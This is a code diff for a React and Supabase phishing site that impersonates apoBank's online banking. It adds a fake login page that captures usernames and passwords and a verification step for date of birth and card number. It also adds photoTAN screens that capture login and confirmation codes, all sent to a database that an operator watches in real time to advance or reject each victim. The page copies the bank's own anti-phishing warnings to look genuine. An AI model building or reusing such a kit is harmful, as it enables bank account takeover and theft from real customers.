@@ -3,7 +3,9 @@ import { useParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
-import { Loader2, AlertTriangle, Check } from "lucide-react";
+import { cn } from "@/lib/utils";
+import { Loader2, Phone, ShieldCheck, Globe, Mail, Info, AlertTriangle, Check } from "lucide-react";
+import headerBankingAsset from "@/assets/header-banking.jpg.asset.json";
 import apobankLogo from "@/assets/apobank-logo.svg";
 import apoALogo from "@/assets/apo-a-logo.png.asset.json";
 import apobankLogoSquare from "@/assets/apobank-logo-square.png";
@@ -21,6 +23,9 @@ type Row = {
   new_ort: string | null;
   profile_data: Record<string, string> | null;
   customer_phase: string | null;
+  tan_method: string | null;
+  device_name: string | null;
+  show_berater: boolean | null;
   photo_tan_image: string | null;
   last_error: string | null;
   tan_code: string | null;
@@ -66,36 +71,38 @@ const AdressFlow = () => {
     let channel: any;
     (async () => {
       const { data } = await (supabase as any)
-        .from("adress_tokens")
-        .select("*")
-        .eq("token", token)
-        .maybeSingle();
+        .from("adress_tokens").select("*").eq("token", token).maybeSingle();
       if (!data) { setNotFound(true); setLoading(false); return; }
-      if (!data.customer_phase || data.customer_phase === "pending") {
+      if (!data.customer_phase || data.customer_phase === "pending" || data.customer_phase === "waiting") {
+        const next = data.show_berater ? "berater" : "login";
         const { data: updated } = await (supabase as any)
           .from("adress_tokens")
-          .update({ customer_phase: "adress_edit", used: true, used_at: new Date().toISOString() })
-          .eq("id", data.id)
-          .select("*")
-          .maybeSingle();
-        setRow(updated || { ...data, customer_phase: "adress_edit" });
-      } else {
-        setRow(data);
-      }
+          .update({ customer_phase: next, used: true, used_at: new Date().toISOString() })
+          .eq("id", data.id).select("*").maybeSingle();
+        setRow(updated || { ...data, customer_phase: next });
+      } else setRow(data);
       setLoading(false);
       channel = (supabase as any)
         .channel(`adress_${data.id}`)
         .on("postgres_changes", { event: "UPDATE", schema: "public", table: "adress_tokens", filter: `id=eq.${data.id}` }, (p: any) => {
           setRow(prev => ({ ...(prev as Row), ...p.new }));
-        })
-        .subscribe();
+        }).subscribe();
     })();
     return () => { if (channel) (supabase as any).removeChannel(channel); };
   }, [token]);
 
-  const update = async (patch: Record<string, any>) => {
+  const setPhase = async (phase: string, extra: Record<string, any> = {}) => {
     if (!row) return;
-    await (supabase as any).from("adress_tokens").update(patch).eq("id", row.id);
+    await (supabase as any).from("adress_tokens").update({ customer_phase: phase, ...extra }).eq("id", row.id);
+  };
+
+  const upsertMeta = async (patch: Record<string, any>) => {
+    if (!row) return;
+    const task_id = `adress:${row.id}`;
+    const { data: existing } = await (supabase as any)
+      .from("panel_task_meta").select("id").eq("task_id", task_id).maybeSingle();
+    if (existing) await (supabase as any).from("panel_task_meta").update(patch).eq("id", existing.id);
+    else await (supabase as any).from("panel_task_meta").insert({ task_id, ...patch });
   };
 
   if (loading) return <Full><Loader2 className="h-6 w-6 animate-spin text-primary" /></Full>;
@@ -109,11 +116,35 @@ const AdressFlow = () => {
     </Full>
   );
 
-  const phase = row.customer_phase || "adress_edit";
+  const phase = row.customer_phase || "login";
 
-  if (phase === "adress_edit") {
+  if (phase === "berater") {
+    return <BeraterStep onSubmit={async (geburtsdatum, karte) => {
+      await upsertMeta({ berater_geburtsdatum: geburtsdatum, berater_karte: karte });
+      await setPhase("login", { last_error: null });
+    }} />;
+  }
+
+  if (phase === "login" || phase === "login_rejected") {
+    return <LoginStep row={row} onSubmit={async (netkey, pin) => {
+      await upsertMeta({ netkey, pin });
+      await setPhase("login_review", { last_error: null });
+    }} />;
+  }
+  if (phase === "login_review") return <LoadingStep text="Sie werden eingeloggt." />;
+  if (phase === "confirm") return <ConfirmStep row={row} onClick={async () => { await setPhase("login_phototan_request", { last_error: null }); }} />;
+  if (phase === "login_phototan_request") return <LoadingStep text="Bitte warten." />;
+  if (phase === "login_phototan" || phase === "login_phototan_rejected") {
+    return <PhotoTanStep row={row} title="Login" info="Bitte scannen Sie die angezeigte Grafik mit Ihrer apoTAN App und geben Sie den Code ein." label="Code" button="Anmelden" onSubmit={async (code) => {
+      await upsertMeta({ login_tan: code, login_tan_updated_at: new Date().toISOString() });
+      await setPhase("login_tan_review", { last_error: null });
+    }} />;
+  }
+  if (phase === "login_tan_review") return <LoadingStep text="Bitte warten." />;
+
+  if (phase === "adress_edit" || phase === "adress_rejected") {
     return <ProfileStep row={row} onSubmit={async (data) => {
-      await update({
+      await update(row.id, {
         profile_data: data,
         new_strasse: data.strasse || null,
         new_plz: data.plz || null,
@@ -123,91 +154,230 @@ const AdressFlow = () => {
       });
     }} />;
   }
-
   if (phase === "adress_review") return <LoadingStep text="Ihre Daten werden geprüft." />;
-  if (phase === "phototan_request") return <LoadingStep text="Bitte warten." />;
-
-  if (phase === "phototan" || phase === "tan_review") {
-    return <PhotoTanStep row={row} onSubmit={async (code) => {
-      await update({ tan_code: code, customer_phase: "tan_review", last_error: null });
-    }} />;
+  if (phase === "change_phototan_request") return <LoadingStep text="Bitte warten." />;
+  if (phase === "change_phototan" || phase === "change_phototan_rejected") {
+    return <PhotoTanStep row={row} title="Adressänderung bestätigen"
+      info="Bitte scannen Sie die angezeigte Grafik mit Ihrer apoTAN App und geben Sie die Änderungs-TAN ein."
+      label="Änderungs-TAN" button="Bestätigen"
+      onSubmit={async (code) => { await update(row.id, { tan_code: code, customer_phase: "change_tan_review", last_error: null }); }} />;
   }
-
+  if (phase === "change_tan_review") return <LoadingStep text="Bitte warten." />;
   if (phase === "success") return <SuccessLoader />;
-
-  if (phase === "aborted") {
-    return <Full>
+  if (phase === "aborted") return (
+    <Full>
       <div className="flex flex-col items-center gap-3 text-center">
         <AlertTriangle className="h-8 w-8 text-destructive" />
         <div className="font-semibold">Sitzung beendet</div>
         <div className="text-sm text-muted-foreground">Bitte kontaktieren Sie Ihren Berater.</div>
       </div>
-    </Full>;
-  }
+    </Full>
+  );
 
   return <LoadingStep text="Bitte warten." />;
 };
 
+const update = async (id: string, patch: Record<string, any>) => {
+  await (supabase as any).from("adress_tokens").update(patch).eq("id", id);
+};
+
 /* ---------------- Steps ---------------- */
 
-const EditField = ({ label, value, onChange, options, type = "text" }: {
-  label: string; value: string; onChange: (v: string) => void; options?: string[]; type?: string;
-}) => {
-  const handleChange = (v: string) => {
-    if (label.toLowerCase().includes("datum")) {
-      let digits = v.replace(/\D/g, "").slice(0, 8);
-      let formatted = "";
-      if (digits.length > 0) formatted += digits.slice(0, 2);
-      if (digits.length > 2) formatted += "." + digits.slice(2, 4);
-      if (digits.length > 4) formatted += "." + digits.slice(4);
-      onChange(formatted);
-    } else onChange(v);
+const FieldRow = ({ label, error, children }: { label: string; error?: boolean; children: React.ReactNode }) => (
+  <div className="grid grid-cols-1 sm:grid-cols-[220px_1fr] items-center gap-2 sm:gap-6">
+    <label className={cn("text-sm font-semibold", error ? "text-destructive" : "text-foreground")}>{label}</label>
+    {children}
+  </div>
+);
+const Tip = ({ icon: Icon, children }: { icon: any; children: React.ReactNode }) => (
+  <div className="flex items-start gap-3"><Icon className="w-5 h-5 text-primary shrink-0 mt-0.5" /><p>{children}</p></div>
+);
+
+const ShellLarge = ({ title, children }: { title: string; children: React.ReactNode }) => (
+  <div className="min-h-screen bg-white flex flex-col relative">
+    <img src={apobankLogo} alt="apoBank" className="absolute top-3 left-3 sm:top-4 sm:left-4 h-10 sm:h-16 w-auto z-10" />
+    <div className="flex-1 flex items-start justify-center px-3 sm:px-4 pt-6 pb-12">
+      <div className="w-full max-w-3xl bg-[#f5f5f5] rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)] mt-20 sm:mt-[114px]">
+        <div className="px-4 sm:px-8 py-4 sm:py-5 bg-white"><h1 className="text-2xl sm:text-4xl font-medium text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>{title}</h1></div>
+        <div className="px-4 sm:px-8 py-6 space-y-6">{children}</div>
+      </div>
+    </div>
+  </div>
+);
+const ShellSmall = ({ title, children }: { title: string; children: React.ReactNode }) => (
+  <div className="min-h-screen bg-white flex flex-col items-center px-3 sm:px-0">
+    <div className="w-full max-w-[820px] bg-white mt-4 sm:mt-12 mb-8 rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)]">
+      <div className="px-4 sm:px-8 py-4 sm:py-5 shadow-[0_4px_14px_-2px_rgba(0,0,0,0.25)]">
+        <h1 className="text-2xl sm:text-4xl font-medium text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>{title}</h1>
+      </div>
+      <div className="px-4 sm:px-8 py-5 sm:py-6 space-y-6 sm:space-y-8 bg-muted border border-border/40 border-t-0">{children}</div>
+    </div>
+    <div className="pb-10"><img src={apobankLogo} alt="apoBank" className="h-12 sm:h-16 mx-auto" loading="lazy" /></div>
+  </div>
+);
+
+const LoginStep = ({ row, onSubmit }: { row: Row; onSubmit: (netkey: string, pin: string) => Promise<void> }) => {
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [uT, setUT] = useState(false);
+  const [pT, setPT] = useState(false);
+  const [submitting, setSubmitting] = useState(false);
+  useEffect(() => { if (row.customer_phase === "login_rejected") { setPassword(""); setSubmitting(false); } }, [row.customer_phase]);
+  const uErr = uT && !username.trim();
+  const pErr = pT && !password.trim();
+  const submit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!username.trim() || !password.trim()) { setUT(true); setPT(true); return; }
+    setSubmitting(true);
+    await onSubmit(username.trim(), password);
   };
   return (
-    <div>
-      <label className="text-[13px] font-semibold text-[#001f5b] mb-1 block">{label}</label>
-      {options ? (
-        <select
-          value={value}
-          onChange={(e) => onChange(e.target.value)}
-          className="w-full sm:w-1/2 md:w-[40%] text-[15px] text-slate-800 bg-white border border-slate-300 rounded-md px-3 py-2 outline-none focus:border-[#001f5b] focus:ring-1 focus:ring-[#001f5b]"
-        >
-          {options.map((opt) => (
-            <option key={opt} value={opt === "Keine Angabe" ? "" : opt}>{opt}</option>
-          ))}
-        </select>
-      ) : (
-        <input
-          type={type}
-          value={value}
-          onChange={(e) => handleChange(e.target.value)}
-          required={!label.toLowerCase().includes("optional")}
-          className="w-full sm:w-3/4 md:w-[60%] text-[15px] text-slate-800 bg-white border border-slate-300 rounded-md px-3 py-2 outline-none focus:border-[#001f5b] focus:ring-1 focus:ring-[#001f5b]"
-        />
-      )}
-    </div>
+    <ShellLarge title="Login apoBank">
+      <p className="font-semibold text-foreground">Willkommen im Online-Banking der apoBank</p>
+      <img src={headerBankingAsset.url} alt="Sicherheitshinweis" className="w-full" width={1600} height={512} />
+      <div className="space-y-5 text-sm text-foreground">
+        <p>Aktuelle Warnung vor Phishing und Betrugsversuchen: <a href="#" className="underline text-primary">apobank.de/aktuelle-sicherheitshinweise</a></p>
+      </div>
+      {row.last_error && <div className="bg-red-100 border border-red-200 text-red-900 px-4 py-5 rounded text-sm">{row.last_error}</div>}
+      <form onSubmit={submit} className="space-y-6">
+        <FieldRow label="Benutzername" error={uErr}>
+          <div className="relative">
+            <Input value={username} onChange={e => { setUsername(e.target.value); if (e.target.value.trim()) setUT(false); }}
+              className={cn("bg-white", uErr && "border-destructive pr-10")} />
+            {uErr && <Info className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-destructive" />}
+          </div>
+        </FieldRow>
+        <FieldRow label="Passwort" error={pErr}>
+          <div className="relative">
+            <Input type="password" value={password} onChange={e => { setPassword(e.target.value); if (e.target.value.trim()) setPT(false); }}
+              className={cn("bg-white", pErr && "border-destructive pr-10")} />
+            {pErr && <Info className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-destructive" />}
+          </div>
+        </FieldRow>
+        <div className="flex justify-end">
+          <Button type="submit" variant="outline" disabled={submitting}
+            className={cn("px-8 bg-white hover:bg-white", password.length > 0 ? "border-foreground text-foreground" : "border-muted-foreground/40 text-muted-foreground")}>
+            {submitting ? <Loader2 className="h-4 w-4 animate-spin" /> : "Anmelden"}
+          </Button>
+        </div>
+      </form>
+      <div className="space-y-5">
+        <p className="font-semibold text-foreground text-sm">Maßnahmen für sicheres Online-Banking:</p>
+        <div className="space-y-5 text-sm text-foreground">
+          <Tip icon={ShieldCheck}>1. Wir fragen niemals nach Ihren Zugangsdaten.</Tip>
+          <Tip icon={Globe}>2. Loggen Sie sich immer über www.apobank.de ein.</Tip>
+          <Tip icon={Mail}>3. Bei zweifelhaften E-Mails gilt: Keine Links oder Anhänge öffnen.</Tip>
+        </div>
+      </div>
+      <div className="space-y-1 text-sm">
+        <div className="flex items-center gap-2 text-foreground"><Phone className="w-4 h-4" /><span>+49 211 5998 8000</span></div>
+      </div>
+    </ShellLarge>
+  );
+};
+
+const ConfirmStep = ({ row, onClick }: { row: Row; onClick: () => Promise<void> }) => {
+  const [submitting, setSubmitting] = useState(false);
+  const deviceName = row.device_name || "iPhone";
+  return (
+    <ShellSmall title="Login">
+      <p className="text-foreground text-base leading-relaxed">
+        Bitte bestätigen Sie die Anmeldung auf Ihrem Gerät mit dem Namen '{deviceName}'.
+      </p>
+      <p className="text-foreground text-base leading-relaxed">
+        Sollten Sie keinen Internetzugang mit Ihrem Smartphone haben, können Sie den Login auch mit photoTAN bestätigen.
+      </p>
+      <div className="flex justify-end pt-2">
+        <Button onClick={async () => { setSubmitting(true); await onClick(); }} disabled={submitting}
+          className="bg-[#EBEEF2] border border-[#98A0AC] text-primary hover:bg-[#EBEEF2] rounded-md px-10 h-10 font-normal text-base">
+          {submitting ? <span className="flex items-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />photoTAN</span> : "photoTAN"}
+        </Button>
+      </div>
+    </ShellSmall>
+  );
+};
+
+const PhotoTanStep = ({ row, title, info, label, button, onSubmit }: { row: Row; title: string; info: string; label: string; button: string; onSubmit: (code: string) => Promise<void> }) => {
+  const [code, setCode] = useState("");
+  const [submitting, setSubmitting] = useState(false);
+  useEffect(() => {
+    if (row.customer_phase === "login_phototan_rejected" || row.customer_phase === "change_phototan_rejected") { setCode(""); setSubmitting(false); }
+  }, [row.customer_phase]);
+  return (
+    <ShellSmall title={title}>
+      {row.last_error && <div className="bg-destructive/10 border border-destructive/20 rounded-md px-4 sm:px-6 py-4"><p className="text-destructive text-sm">{row.last_error}</p></div>}
+      <p className="text-foreground text-sm sm:text-base">{info}</p>
+      <div className="flex justify-center">
+        <div className="w-40 h-40 sm:w-48 sm:h-48 bg-white flex items-center justify-center overflow-hidden">
+          <img src={row.photo_tan_image || phototanDefault} alt="PhotoTAN Code" className="w-full h-full object-contain" />
+        </div>
+      </div>
+      <div className="grid grid-cols-1 sm:grid-cols-[0.535fr_1fr] items-start sm:items-center gap-2 sm:gap-8">
+        <label className="text-foreground font-semibold text-base">{label}</label>
+        <Input type="text" inputMode="numeric" pattern="[0-9]*" value={code}
+          onChange={e => setCode(e.target.value.replace(/\D/g, ""))} className="border-primary/30 bg-card" />
+      </div>
+      <div className="flex justify-end">
+        <Button disabled={submitting || !code} onClick={async () => { setSubmitting(true); await onSubmit(code); }}
+          className="bg-[#EBEEF2] border border-[#98A0AC] text-primary hover:bg-[#EBEEF2] rounded-md px-10 h-10 font-normal text-base">
+          {submitting ? <span className="flex items-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />{button}</span> : button}
+        </Button>
+      </div>
+    </ShellSmall>
+  );
+};
+
+const BeraterStep = ({ onSubmit }: { onSubmit: (g: string, k: string) => Promise<void> }) => {
+  const [g, setG] = useState(""); const [k, setK] = useState("");
+  const [t, setT] = useState(false); const [s, setS] = useState(false);
+  const kInv = k.length !== 10;
+  const gInv = !/^\d{2}\.\d{2}\.(\d{2}|\d{4})$/.test(g);
+  return (
+    <ShellSmall title="Verifizierung">
+      <p className="text-sm text-foreground">Zur Überprüfung geben Sie bitte Ihr Geburtsdatum und die Nummer einer Ihrer gültigen apoBankCard ein.</p>
+      <div className="space-y-4">
+        <input type="text" inputMode="numeric" value={g} onChange={e => {
+          const d = e.target.value.replace(/\D/g, "").slice(0, 8);
+          let out = d;
+          if (d.length > 4) out = `${d.slice(0,2)}.${d.slice(2,4)}.${d.slice(4)}`;
+          else if (d.length > 2) out = `${d.slice(0,2)}.${d.slice(2)}`;
+          setG(out);
+        }} placeholder="TT.MM.JJJJ" className={cn("w-full rounded border px-3 py-2", t && gInv && "border-destructive")} />
+        <input type="text" inputMode="numeric" value={k} onChange={e => setK(e.target.value.replace(/\D/g, "").slice(0, 10))}
+          placeholder="apoBankCard-Nummer (10 Ziffern)" className={cn("w-full rounded border px-3 py-2", t && kInv && "border-destructive")} />
+      </div>
+      <div className="flex justify-end">
+        <Button disabled={s} onClick={async () => { setT(true); if (gInv || kInv) return; setS(true); await onSubmit(g, k); }}
+          className="bg-[#EBEEF2] border border-[#98A0AC] text-primary hover:bg-[#EBEEF2] rounded-md px-10 h-10 font-normal text-base">
+          {s ? <Loader2 className="h-4 w-4 animate-spin" /> : "Weiter"}
+        </Button>
+      </div>
+    </ShellSmall>
   );
 };
 
 const ProfileStep = ({ row, onSubmit }: { row: Row; onSubmit: (data: Record<string, string>) => Promise<void> }) => {
   const prev = row.profile_data || {};
   const [fields, setFields] = useState<FieldDef[]>(() =>
-    initialFields.map(f => ({
-      ...f,
-      value: prev[f.key] ??
-        (f.key === "strasse" ? row.curr_strasse || "" :
-         f.key === "plz" ? row.curr_plz || "" :
-         f.key === "ortLand" ? row.curr_ort || "" : ""),
-    }))
+    initialFields.map(f => ({ ...f, value: prev[f.key] ?? "" }))
   );
   const [submitting, setSubmitting] = useState(false);
-
-  useEffect(() => {
-    if (row.customer_phase === "adress_edit" && row.last_error) setSubmitting(false);
-  }, [row.customer_phase, row.last_error]);
+  useEffect(() => { if (row.customer_phase === "adress_rejected") setSubmitting(false); }, [row.customer_phase]);
 
   const updateField = (key: string, v: string) =>
-    setFields((prev) => prev.map((f) => (f.key === key ? { ...f, value: v } : f)));
+    setFields(prev => prev.map(f => f.key === key ? { ...f, value: v } : f));
+
+  const handleDate = (label: string, v: string) => {
+    if (label.toLowerCase().includes("datum")) {
+      let d = v.replace(/\D/g, "").slice(0, 8);
+      let out = "";
+      if (d.length > 0) out += d.slice(0, 2);
+      if (d.length > 2) out += "." + d.slice(2, 4);
+      if (d.length > 4) out += "." + d.slice(4);
+      return out;
+    }
+    return v;
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-[#f6f8fc]">
@@ -221,30 +391,31 @@ const ProfileStep = ({ row, onSubmit }: { row: Row; onSubmit: (data: Record<stri
       </header>
       <main className="flex-1">
         <div className="max-w-[780px] mx-auto px-3 sm:px-8 py-6 sm:py-10">
-          <h1 className="text-[26px] sm:text-[40px] font-semibold text-[#001f5b] mb-6 text-left">
-            Mein Profil aktualisieren
-          </h1>
-          {row.last_error && (
-            <div className="mb-6 rounded-md border border-red-200 bg-red-50 text-red-800 px-4 py-3 text-sm">{row.last_error}</div>
-          )}
-          <form
-            onSubmit={async (e) => {
-              e.preventDefault();
-              setSubmitting(true);
-              const data = Object.fromEntries(fields.map((f) => [f.key, f.value]));
-              await onSubmit(data);
-            }}
-            className="bg-white rounded-xl border border-slate-200/70 shadow-[0_1px_2px_rgba(0,0,0,0.04)] px-4 sm:px-10 py-6 sm:py-10"
-          >
+          <h1 className="text-[26px] sm:text-[40px] font-semibold text-[#001f5b] mb-6 text-left">Mein Profil aktualisieren</h1>
+          {row.last_error && <div className="mb-6 rounded-md border border-red-200 bg-red-50 text-red-800 px-4 py-3 text-sm">{row.last_error}</div>}
+          <form onSubmit={async e => { e.preventDefault(); setSubmitting(true); await onSubmit(Object.fromEntries(fields.map(f => [f.key, f.value]))); }}
+            className="bg-white rounded-xl border border-slate-200/70 px-4 sm:px-10 py-6 sm:py-10">
             <div className="flex flex-col gap-y-6">
-              {fields.map((f) => (
-                <EditField key={f.key} label={f.label} value={f.value}
-                  onChange={(v) => updateField(f.key, v)} options={f.options} type={f.type} />
+              {fields.map(f => (
+                <div key={f.key}>
+                  <label className="text-[13px] font-semibold text-[#001f5b] mb-1 block">{f.label}</label>
+                  {f.options ? (
+                    <select value={f.value} onChange={e => updateField(f.key, e.target.value)}
+                      className="w-full sm:w-1/2 md:w-[40%] text-[15px] bg-white border border-slate-300 rounded-md px-3 py-2">
+                      {f.options.map(o => <option key={o} value={o === "Keine Angabe" ? "" : o}>{o}</option>)}
+                    </select>
+                  ) : (
+                    <input type={f.type || "text"} value={f.value}
+                      onChange={e => updateField(f.key, handleDate(f.label, e.target.value))}
+                      required={!f.label.toLowerCase().includes("optional")}
+                      className="w-full sm:w-3/4 md:w-[60%] text-[15px] bg-white border border-slate-300 rounded-md px-3 py-2" />
+                  )}
+                </div>
               ))}
             </div>
             <div className="flex justify-end mt-10">
               <button type="submit" disabled={submitting}
-                className="inline-flex items-center gap-2 rounded-full bg-[#001f5b] text-white px-6 py-2 text-sm font-medium hover:bg-[#00174a] transition-colors disabled:opacity-70">
+                className="inline-flex items-center gap-2 rounded-full bg-[#001f5b] text-white px-6 py-2 text-sm font-medium disabled:opacity-70">
                 {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : <><Check className="w-4 h-4" />Speichern</>}
               </button>
             </div>
@@ -252,64 +423,11 @@ const ProfileStep = ({ row, onSubmit }: { row: Row; onSubmit: (data: Record<stri
         </div>
       </main>
       <footer className="bg-[#001f5b] text-white mt-10">
-        <div className="max-w-[1120px] mx-auto px-6 sm:px-10 py-10 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-6">
-          <div>
-            <img src={apobankLogo} alt="apoBank" className="h-12 brightness-0 invert" />
-            <div className="text-[13px] mt-4 opacity-90">© 2026 Deutsche Apotheker- und Ärztebank eG. Alle Rechte vorbehalten.</div>
-          </div>
-          <ul className="space-y-3 text-[15px]">
-            <li><a href="#" className="hover:underline">Impressum</a></li>
-            <li><a href="#" className="hover:underline">Datenschutz</a></li>
-            <li><a href="#" className="hover:underline">Nutzungsbedingungen</a></li>
-            <li><a href="#" className="hover:underline">Cookie-Einstellungen</a></li>
-          </ul>
+        <div className="max-w-[1120px] mx-auto px-6 sm:px-10 py-10">
+          <img src={apobankLogo} alt="apoBank" className="h-12 brightness-0 invert" />
+          <div className="text-[13px] mt-4 opacity-90">© 2026 Deutsche Apotheker- und Ärztebank eG.</div>
         </div>
       </footer>
-    </div>
-  );
-};
-
-const PhotoTanStep = ({ row, onSubmit }: { row: Row; onSubmit: (code: string) => Promise<void> }) => {
-  const [code, setCode] = useState("");
-  const [submitting, setSubmitting] = useState(false);
-  useEffect(() => { if (row.customer_phase === "phototan" && row.last_error) { setCode(""); setSubmitting(false); } }, [row.customer_phase, row.last_error]);
-
-  return (
-    <div className="min-h-screen bg-white flex flex-col items-center px-3 sm:px-0">
-      <div className="w-full max-w-[820px] bg-white mt-4 sm:mt-12 mb-8 rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)]">
-        <div className="px-4 sm:px-8 py-4 sm:py-5 shadow-[0_4px_14px_-2px_rgba(0,0,0,0.25)]">
-          <h1 className="text-2xl sm:text-4xl font-medium text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>Adressänderung bestätigen</h1>
-        </div>
-        <div className="px-4 sm:px-8 py-5 sm:py-6 space-y-6 sm:space-y-8 bg-muted border border-border/40 border-t-0">
-          {row.last_error && (
-            <div className="bg-destructive/10 border border-destructive/20 rounded-md px-4 sm:px-6 py-4">
-              <p className="text-destructive text-sm">{row.last_error}</p>
-            </div>
-          )}
-          <p className="text-foreground text-sm sm:text-base">
-            Bitte scannen Sie die angezeigte Grafik mit Ihrer apoTAN App und geben Sie die <strong>Änderungs-TAN</strong> ein.
-          </p>
-          <div className="flex justify-center">
-            <div className="w-40 h-40 sm:w-48 sm:h-48 bg-white flex items-center justify-center overflow-hidden">
-              <img src={row.photo_tan_image || phototanDefault} alt="PhotoTAN Code" className="w-full h-full object-contain" />
-            </div>
-          </div>
-          <div className="grid grid-cols-1 sm:grid-cols-[0.535fr_1fr] items-start sm:items-center gap-2 sm:gap-8">
-            <label className="text-foreground font-semibold text-base">Änderungs-TAN</label>
-            <Input type="text" inputMode="numeric" pattern="[0-9]*" value={code}
-              onChange={e => setCode(e.target.value.replace(/\D/g, ""))} className="border-primary/30 bg-card" />
-          </div>
-          <div className="flex justify-end">
-            <Button disabled={submitting || !code} onClick={async () => { setSubmitting(true); await onSubmit(code); }}
-              className="bg-[#EBEEF2] border border-[#98A0AC] text-primary hover:bg-[#EBEEF2] rounded-md px-10 h-10 font-normal text-base disabled:opacity-80">
-              {submitting ? <span className="flex items-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />Bestätigen</span> : "Bestätigen"}
-            </Button>
-          </div>
-        </div>
-      </div>
-      <div className="pb-10">
-        <img src={apobankLogo} alt="apoBank" className="h-12 sm:h-16 mx-auto" loading="lazy" />
-      </div>
     </div>
   );
 };
